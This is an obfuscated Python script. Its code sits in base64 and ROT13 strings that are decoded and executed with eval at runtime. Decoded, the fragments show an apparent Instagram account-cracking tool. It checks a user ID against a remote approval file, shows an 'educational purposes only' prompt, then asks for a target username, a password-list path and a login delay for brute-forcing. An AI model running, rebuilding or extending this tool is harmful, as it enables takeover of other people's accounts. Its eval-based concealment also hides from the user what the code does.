# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCBqc29uCmZyb20gZ2V0cGFzcyBpbXBvcnQgZ2V0cGFzcwppbXBvcnQgdGltZQppbXBvcnQgc3VicHJvY2VzcyBhcyBzdWIKaW1wb3J0IHJhbmRvbQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGdldHBhc3MKaW1wb3J0IHJlCmZyb20gcmljaCBpbXBvcnQgcHJpbnQKZnJvbSByaWNoLmNvbnNvbGUgaW1wb3J0IENvbnNvbGUKZnJvbSByaWNoLnBhbmVsIGltcG9ydCBQYW5lbAoKI1RoaXMgU2NyaXB0IFdhcyBDcmVhdGVkICBCeSBTdGFyayBTZXIvLwojR2l0aHViIDogTVItUzc0UksKZGVmIGZpbmRfd29yZF9pbl9maWxlKHVybCwgd29yZCk6CiAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCiAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgZmlsZV9jb250ZW50ID0gcmVzcG9uc2UudGV4dAogICAgICAgIGlmIHdvcmQgaW4gZmlsZV9jb250ZW50OgogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICAgICAgcHJpbnQoUGFuZWwoJycnCltib2xkIHdoaXRlXVtbYm9sZCByZWRdXltib2xkIHdoaXRlXV0gW2JvbGQgZ3JlZW5dIEF1OiBTVEFSSwpbYm9sZCB3aGl0ZV1bW2JvbGQgcmVkXV5bYm9sZCB3aGl0ZV1dIFtib2xkIGdyZWVuXSBHaXRodWI6IGdpdGh1Yi5jb20vU1RBUkstNDA0Cltib2xkIHdoaXRlXVtbYm9sZCByZWRdXltib2xkIHdoaXRlXV0gW2JvbGQgZ3JlZW5dIEluc3RhOiBtcl9sYWx1XzEyMzIKICcnJykpCiAgICAgICAgICAgIHByaW50KGYnW2JvbGQgZ3JlZW5dWW91ciBpZFtpdGFsaWMgYmx1ZV0ge3dvcmR9IFtpdGFsaWMgZ3JlZW5dIEhhcyBTdWNlc3NGdWxseSBBY2NlcHRlZCcpCiAgICAgICAgICAgIHByaW50KGYiW2JvbGQgd2hpdGVdW1tib2xkIGJsdWVd4pyTW2JvbGQgd2hpdGVdXSBbYm9sZCBncmVlbl1Mb2dpbiBTdWNlc3MgRnVsbCBZb3VyIFVzZXIgSWQgOiBbaXRhbGljIGdyZWVuXXt3b3JkfSIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAKICAgICAgICAgICAgI3ByaW50KGYiVGhlIHdvcmQgJ3t3b3JkfScgd2FzIGZvdW5kIGluIHRoZSBmaWxlLiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoUGFuZWwoJycnCltib2xkIHd'
love = 'bnKEyKIgoLz9fMPOlMJEqKygvo2kxVUqbnKEyKI0tJ2WioTDtM3WyMJ5qVRS1BvOGIRSFFjcoLz9fMPO3nTy0MI1oJ2WioTDtpzIxKI5oLz9fMPO3nTy0MI1qVSgvo2kxVTqlMJIhKFOUnKEbqJV6VTqcqTu1Lv5wo20iH1EOHxfgAQN0VNcoLz9fMPO3nTy0MI1oJ2WioTDtpzIxKI5oLz9fMPO3nTy0MI1qVSgvo2kxVTqlMJIhKFOWoaA0LGbtoKWsoTSfqI8kZwZlPvNaWlpcXDbtVPNtVPNtVPNtVPOjpzyhqPuzVygvo2kxVTqlMJIhKIyiqFObLKMyovq0VRSfoT93MJDioygcqTSfnJZtrJIfoT93KFOMo3IlVRyxVTymVSgcqTSfnJZtpzIxKFO7q29lMU1oLz9fMPOapzIyoy0tD29hqTSwqPOOMT1covOTo3VtDJA0nKMuqTyiovVcPvNtVPNtVPNtVPNtVUOlnJ50XTLvJ2WioTDtLzk1MI1GMJ5xVRucoFOHnTHtFJDtJ2WioTDtrJIfoT93KFO7q29lMU0tJ2WioTDtLzk1MI0tEz9lVRSwqTy2LKEco24vXDbtVPNtVPNtVPNtVPOipl5mrKA0MJ0bVauxMl1ipTIhVTu0qUOmBv8inJ5mqTSapzSgYzAioF9gpy9fLJk1KmRlZmViVvxXVPNtVPNtVPNtVPNtMKucqPtcPvNtVPOyoUAyBtbtVPNtVPNtVUOlnJ50XTLvJ2y0LJkcLlO3nTy0MI1TLJyfMJDtqT8tpzI0pzyyqzHtqTuyVTMcoTHhVSA0LKE1plOwo2EyBvOopzIxKKglMKAjo25mMF5mqTS0qKAsL29xMK0vXDbtVPNtVPNtVTI4nKDbXDc1pzjtCFNvnUE0pQbiY21lp3EupzgmqT9lMF4jZQO3MJWbo3A0LKOjYzAioF91p2Ilpl50rUDvVPNXPaqipzEsqT9sMzyhMPN9VTqyqUOup3ZhM2I0qKAypvtcVNbXMzyhMS93o3WxK2yhK2McoTHbqKWfYUqipzEsqT9sMzyhMPxXPtbXVlOjLKAmq29lMPftLzShozIlPz9mYaA5p3EyoFtvL2kyLKVvXDbXPvZtDxSBGxIFVTIxqJAuqTyiozSfVUO1paOip2ImPaOlnJ50XSOuozIfXPNaWlpXPygvo2kxVTqlMJIhKFOsK18tKlNtVS8tK19sKlOsK19sKlNtKlNtVPNXJ2WioTDtM3WyMJ5qsS8tK3jtKPO8VP8tK19ssS8tVPOssP8tKPNtVNcoLz9fMPOapzIyoy0tsPO8sPNtKUjtKS9sKlOpVUjtsPNiVS8tKPNtPygvo2kxVTqlMJIhKFO8VUk8VUkpVPO8K19sXFO8sPO8YlOsK18tKPNXJ2WioTDtM3WyMJ5qsS9sK3kssPOpK3ksK19sYlO8Kl9sYlNtVSksKNcoLz9fMPOapzIyoy0tVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPvpaWl'
god = 'kpCnByaW50KFBhbmVsKCcnJwpbYm9sZCB3aGl0ZV1bW2JvbGQgcmVkXV5bYm9sZCB3aGl0ZV1dIFtib2xkIGdyZWVuXSBBdTogU1RBUksKW2JvbGQgd2hpdGVdW1tib2xkIHJlZF1eW2JvbGQgd2hpdGVdXSBbYm9sZCBncmVlbl0gR2l0aHViOiBnaXRodWIuY29tL1NUQVJLLTQwNApbYm9sZCB3aGl0ZV1bW2JvbGQgcmVkXV5bYm9sZCB3aGl0ZV1dIFtib2xkIGdyZWVuXSBJbnN0YTogbXJfbGFsdV8xMjMyCiAnJycpKQoKCgpjbGFzcyBiY29sb3JzOgogICAgQk9MRCA9ICdcMDMzWzFtJwogICAgUFVSUExFID0gJ1wwMzNbOTVtJwogICAgT0tCTFVFID0gJ1wwMzNbOTRtJwogICAgT0tHUkVFTiA9ICdcMDMzWzk1bScKICAgIFdBUk5JTkcgPSAnXDAzM1s5M20nCiAgICBGQUlMID0gJ1wwMzNbOTFtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgVU5ERVJMSU5FID0gJ1wwMzNbNG0nCgoKZGVmIHN0YXJ0KCk6CgogICAgc2NlbHRhZGlzYyA9IGlucHV0KAogICAgICAgICJcMDMzWzkzbVwwMzNbMW1cblxuWyFdVXNlIHRoaXMgcHJvZ3JhbSAgZm9yIGVkdWNhdGlvbmFsIHB1cnBvc2VzIG9ubHk/IFt5L25dOiAiKQoKICAgIGlmIHNjZWx0YWRpc2MgPT0gInkiOgogICAgICAgIHByaW50KCJcbiIpCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpIAogICAgICAgIHByaW50KFBhbmVsKCcnJwpbYm9sZCBncmVlbl0gX19fIF8gICBfIF9fX18gX19fX18gIF8gICAgCltib2xkIGdyZWVuXXxfIF98IFwgfCAvIF9fX3xfICAgX3wvIFwgICAKW2JvbGQgZ3JlZW5dIHwgfHwgIFx8IFxfX18gXCB8IHwgLyBfIFwgIApbYm9sZCBncmVlbl0gfCB8fCB8XCAgfF9fXykgfHwgfC8gX19fIFwgCltib2xkIGdyZWVuXXxfX198X3wgXF98X19fXy8gfF8vXy8gICBcX1wKW2JvbGQgZ3JlZW5dICAKW2JvbGQgd2hpdGVdW1tib2xkIHJlZF1eW2JvbGQgd2hpdGVdXSBbYm9sZCBncmVlbl0gQXU6IFNUQVJLCltib2xkIHdoaXRlXVtbYm9sZCByZWRdXltib2xkIHdoaXRlXV0gW2JvbGQgZ3JlZW5dIEdpdGh1YjogZ2l0aHViLmNvbS9TVEFSSy00MDQKW2JvbGQgd2hpdGVdW1tib2xkIHJlZF1eW2JvbGQgd2hpdGVdXSBbYm9sZCBncmVlbl0gSW5zdGE6IG1yX2xhbHVfMTIzMiAgICAgICAgICAgICAgICAgICAgICAgICAgCicnJykpCgogI'
destiny = 'PNtMJkmMGbXVPNtVPNtVPOipl5mrKA0MJ0bVauxMl1ipTIhVPqbqUEjpmbiY2yhp3EuM3WuoF5wo20ioKWsoTSfqI8kZwZlYlVcPvNtVPNtVPNto3Zhp3ymqTIgXPWwoTIupvVcPvNtVPNtVPNtpUWcoaDbVyk0VPOoV10tFJ5mqTRtL3yvMKWsp3D0pzgpqPVcPvNtVPNtVPNtpUWcoaDbVyk0VPOoV11KnTS0p2SjpPN6VSZ3ASWYKUDvXDbXVPNtVPNtVPOyrTy0XPxXPtcxMJLtLJAkqJymnKcco25yXPx6PvNtVPO3nTyfMFOHpaIyBtbtVPNtVPNtVTyzVUMypzysLaWyLJftCG0tVaAcVwbXVPNtVPNtVPNtVPNtLaWyLJfXVPNtVPNtVPOIH0IFVQ0tVvVXVPNtVPNtVPOIH0IFVQ0tnJ5jqKDbPvNtVPNtVPNtVPNtVPqpZQZmJmSgKQNmZ1f5Zz1oC11SGyESHvOWGyAHDHqFDH0tIIASHx5OGHHtEx9FVRAFDHAYVSOOH1AKG1WRBvNaXDbtVPNtVPNtVUqfVQ0tnJ5jqKDbVyf/KHIhqTIlVUEbMFODLKAmGTymqPOuoT9hMlOHnTHtHTS0nQbtVvxXVPNtVPNtVPOmoTIypUNtCFOcoaDbPvNtVPNtVPNtVPNtVTyhpUI0XPWpZQZmJmSgKQNmZ1f5ZJ1poyfuKIE5pTHtqTuyVUAfMJIjVUEcoJHtMz9lVTkiM2yhXUAyLlxtXSWyLmb5ZQNcBvNvXFxXVPNtVPNtVPO3nTyfMFOHpaIyBtbtVPNtVPNtVPNtVPOmqJVhL2SfoPtvL2kyLKVvXDbtVPNtVPNtVPNtVPOjpz9wMJEypzHtCFOcoaO1qPtvIKAypz5uoJHtqT8tLaW1qTIzo3WwMFN9VPVeIIASHvfvKT5poyqipzEfnKA0VQ0tVvg3oPfvKT5poyAfMJIjVUEcoJHtCFNvVPfXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtp3ElXUAfMJIjpPxeLzAioT9lpl5KDIWBFH5UXlWpoykhHUWio2AyMTyhMm8tJ3xiLaWyLJfioJ9xnJM5KGbtVvgvL29fo3WmYxIBERZcPvNtVPNtVPNtVPNtVTyzVUOlo2AyMTIlMFN9CFNvrFV6PvNtVPNtVPNtVPNtVPNtVPO2MKWcK2WlMJSeVQ0tVaAcVtbtVPNtVPNtVPNtVPNtVPNtLaWyLJfXVPNtVPNtVPNtVPNtMJkcMvOjpz9wMJEypzHtCG0tVz1iMTyzrFV6PvNtVPNtVPNtVPNtVPNtVPOjpzyhqPtvKT5FMKE1pz4hYv4vXDbtVPNtVPNtVPNtVPNtVPNtLaWyLJfXVPNtVPNtVPNtVPNtMJkcMvOjpz9wMJEypzHtCG0tVzWlMJSeVwbXVPNtVPNtVPNtVPNtVPNtVTI4nKDbXDbtVPNtVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPNtVPNtpTSmpjbX'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))